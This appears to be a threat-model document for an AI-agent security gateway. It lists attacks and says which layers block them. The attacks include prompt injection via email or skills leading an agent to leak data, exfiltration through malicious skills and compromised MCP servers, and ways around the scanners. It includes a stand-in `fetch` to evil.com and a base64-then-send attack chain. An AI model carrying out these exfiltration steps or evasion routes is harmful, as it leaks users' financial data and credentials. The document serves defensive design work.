# Adversary Profiles

## LLM-mediated attack (most common, most dangerous)

Prompt injection — via malicious email, document, or skill response — tricks the agent into including sensitive data in a legitimate tool call. The agent doesn't know it's being manipulated. This is the Superhuman and EchoLeak pattern.

**Blocked by**:
- Tidegate gateway scans all outbound values (Layer 2, hard boundary)
- For non-MCP HTTP calls, agent-proxy scans request bodies (Layer 3, hard boundary)
- If the agent runs a script that reads + sends the data, Layer 1 taint tracking blocks the connect()

**Not blocked**: Semantic rephrasing. If the agent summarizes a credit card number as "the card ending in 4242 with expiry next March," no pattern scanner catches it.

## Malicious marketplace skill (ClawHavoc pattern)

A skill contains code that directly attempts exfiltration — `fetch()` to an attacker server, reading credentials from environment, accessing SSH keys.

**Blocked by**:
- `fetch("https://evil.com")` — blocked by agent-proxy (domain not allowlisted) (Layer 3)
- Reading credentials from `process.env` — no credentials exist in agent container
- Reading `~/.ssh/` — not mounted into agent container
- Exfiltrating via MCP tool call parameters — scanned by gateway (Layer 2)

**Not blocked**: Reading workspace files that the user intentionally mounted. The skill can read any file the agent can read. This is a hard architectural limit — the user mounted those files because they want the agent to use them.

## Encryption before exfiltration

A skill or prompt injection causes the agent to encode sensitive data before exfiltrating it, defeating pattern-based scanning at the network boundary.

Attack chain: read bank statement → `base64 < statement.csv` → send encoded blob to allowed domain. Layers 2 and 3 see a high-entropy string going to a legitimate API — no credit card patterns, no SSN formats, nothing to match.

**Blocked by**: Layer 1 journal-based taint tracking. eBPF observes the process opening `statement.csv`. The scanner daemon reads the file from the shared volume, finds credit card numbers (Luhn match), and taints the PID. When the process attempts `connect()` to exfiltrate, seccomp-notify pauses the thread. tg-scanner checks the taint table — tainted PID, deny (`EPERM`). Connection never established.

This works regardless of how the encoding is done — direct `base64` command, Python script with `glob("**/*.csv")` + encryption, obfuscated code. Taint is set by the file access (observed by the kernel), not by analyzing the encoding step. tg-scanner being open source doesn't help the attacker avoid taint — the kernel observes the actual `openat` syscall, not the code that triggers it.

## Prompt injection with semantic rephrasing

Attacker crafts input causing the agent to rephrase sensitive data as natural language, defeating all pattern-based scanning.

**Not blocked**: "The card ending in 4242 with expiry next March" contains no scannable pattern. This is the fundamental limit of all scanning-based approaches, across all layers.

## Compromised MCP server (supply chain)

A community MCP server is backdoored — it sends malicious responses or exfiltrates data it receives.

**Partially blocked by**: Response scanning catches credentials/financial data in MCP server responses before they reach the agent. Credential isolation means the compromised server only has its own API keys.

**Not blocked**: The server can silently misuse its own API access (e.g., a Slack MCP server could post to channels the user didn't intend). This is inherent to the MCP trust model.

## Direct container escape

An attacker with arbitrary code execution escapes the Docker container.

**Not blocked**: Docker shares the host kernel. Mitigated by: `cap_drop: ALL`, `no-new-privileges: true`, `read_only: true`, resource limits. For higher assurance, use gVisor or Firecracker.
